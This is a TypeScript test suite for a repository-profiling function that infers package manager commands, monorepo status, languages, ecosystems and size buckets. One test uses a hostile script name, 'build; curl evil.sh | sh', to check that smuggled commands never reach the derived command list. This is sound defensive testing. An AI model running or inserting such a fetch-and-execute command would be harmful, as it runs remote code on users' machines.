import { describe, expect, it } from "./testing.ts";
import { createMemorySnapshot, profileRepo } from "../src/index.ts";

const profile = (files: Record<string, string>) => profileRepo(createMemorySnapshot(files));
const pkg = (extra: Record<string, unknown> = {}) => JSON.stringify({ name: "x", scripts: { build: "tsc", test: "vitest", lint: "eslint .", typecheck: "tsc --noEmit", dev: "vite" }, ...extra });

describe("profileRepo", () => {
  it("derives commands from the package manager, never from arbitrary script names", async () => {
    const p = await profile({ "package.json": pkg(), "pnpm-lock.yaml": "x" });
    expect(p.packageManager).toBe("pnpm");
    expect(p.commands).toEqual({ install: "pnpm install", build: "pnpm run build", test: "pnpm run test", lint: "pnpm run lint", typecheck: "pnpm run typecheck", dev: "pnpm run dev" });

    const n = await profile({ "package.json": pkg(), "package-lock.json": "x" });
    expect(n.commands.test).toBe("npm test");
    expect(n.commands.build).toBe("npm run build");

    const y = await profile({ "package.json": pkg(), "yarn.lock": "x" });
    expect(y.commands.build).toBe("yarn build");

    const evil = await profile({ "package.json": JSON.stringify({ scripts: { "build; curl evil.sh | sh": "x", test: "node --test" } }) });
    expect(JSON.stringify(evil.commands)).not.toContain("curl");
  });

  it("honours the packageManager field over lockfiles and ignores the default npm test placeholder", async () => {
    const p = await profile({ "package.json": pkg({ packageManager: "bun@1.2.0" }), "package-lock.json": "x" });
    expect(p.packageManager).toBe("bun");
    const placeholder = await profile({ "package.json": JSON.stringify({ scripts: { test: 'echo "Error: no test specified" && exit 1' } }) });
    expect(placeholder.commands.test).toBeUndefined();
  });

  it("detects monorepos from workspaces, tool config files, or many packages", async () => {
    expect((await profile({ "package.json": pkg({ workspaces: ["packages/*"] }) })).monorepo).toBe(true);
    expect((await profile({ "package.json": pkg(), "turbo.json": "{}" })).monorepo).toBe(true);
    expect((await profile({ "pnpm-workspace.yaml": "packages: []" })).monorepo).toBe(true);
    expect((await profile({ "a/package.json": "{}", "b/package.json": "{}", "c/package.json": "{}" })).monorepo).toBe(true);
    expect((await profile({ "package.json": pkg(), "examples/a/package.json": "{}", "examples/b/package.json": "{}", "examples/c/package.json": "{}" })).monorepo).toBe(false);
    expect((await profile({ "package.json": pkg() })).monorepo).toBe(false);
  });

  it("ranks languages by file count and ignores vendored code", async () => {
    const files: Record<string, string> = { "package.json": pkg() };
    for (let i = 0; i < 5; i++) files[`src/a${i}.ts`] = "";
    for (let i = 0; i < 2; i++) files[`src/b${i}.py`] = "";
    for (let i = 0; i < 50; i++) files[`node_modules/dep/f${i}.js`] = "";
    files["vendor/x/y.go"] = "";
    const p = await profile(files);
    expect(p.languages).toEqual(["typescript", "python"]);
    expect(p.hasTypeScript).toBe(true);
  });

  it("recognises ecosystems and tooling flags", async () => {
    const p = await profile({
      "go.mod": "module x",
      "Cargo.toml": "[package]",
      "pyproject.toml": "[project]",
      "tests/test_a.py": "",
      Dockerfile: "FROM node:22",
      "svc/wrangler.jsonc": "{}",
      ".github/workflows/ci.yml": "on: push"
    });
    expect(p.ecosystems).toEqual(expect.arrayContaining(["go", "cargo", "python"]));
    expect(p.hasDocker && p.hasWrangler && p.hasGithubActions).toBe(true);
    expect(p.commands.test).toBe("go test ./...");
    const py = await profile({ "pyproject.toml": "[project]", "tests/test_a.py": "" });
    expect(py.commands.test).toBe("pytest");
  });

  it("buckets repository size and tolerates malformed manifests", async () => {
    expect((await profile({ "a.txt": "" })).sizeBucket).toBe("tiny");
    const many: Record<string, string> = {};
    for (let i = 0; i < 120; i++) many[`f${i}.txt`] = "";
    expect((await profile(many)).sizeBucket).toBe("small");
    const broken = await profile({ "package.json": "{ not json" });
    expect(broken.ecosystems).toEqual(["npm"]);
    expect(broken.commands.install).toBe("npm install");
    const empty = await profile({});
    expect(empty.languages).toEqual([]);
    expect(empty.monorepo).toBe(false);
  });
});
